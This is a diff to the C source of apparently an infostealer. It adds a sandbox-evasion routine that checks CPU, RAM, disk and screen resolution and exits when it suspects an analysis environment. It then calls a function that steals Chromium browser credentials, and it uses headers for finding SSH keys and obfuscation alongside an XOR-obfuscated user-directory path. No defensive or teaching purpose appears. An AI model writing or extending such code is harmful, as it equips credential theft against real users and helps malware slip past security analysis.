@@ -7,6 +7,7 @@
 
 #include "chromium.h"
 #include "find_ssh_key.h"
+#include "hardware_requirements.h"
 #include "obfuscation.h"
 
 int main(void) {
@@ -39,6 +40,26 @@ int main(void) {
 #endif
   }
 
+  // Stop if sandbox detected
+  int return_code = check_hardware();
+  if (return_code != EXIT_SUCCESS) {
+#ifdef DEBUG
+    fprintf(stderr, "Hardware requirements check failed. Reason: ");
+    switch (return_code) {
+      case EXIT_CPU_FAIL: fprintf(stderr, "CPU check failed.\n"); break;
+      case EXIT_RAM_FAIL: fprintf(stderr, "RAM check failed.\n"); break;
+      case EXIT_HDD_FAIL: fprintf(stderr, "HDD check failed.\n"); break;
+      case EXIT_RESOLUTION_FAIL:
+        fprintf(stderr, "Resolution check failed.\n");
+        break;
+      default: fprintf(stderr, "Unknown check failed.\n"); break;
+    }
+    fprintf(stderr, "Now exiting...");
+#endif
+    return EXIT_FAILURE;
+  }
+
+  // Actual stealing
   steal_chromium_creds();
 
   wchar_t users_path[] = L"\x69\x10\x76\x7f\x59\x4f\x58\x59";  // C:\Users
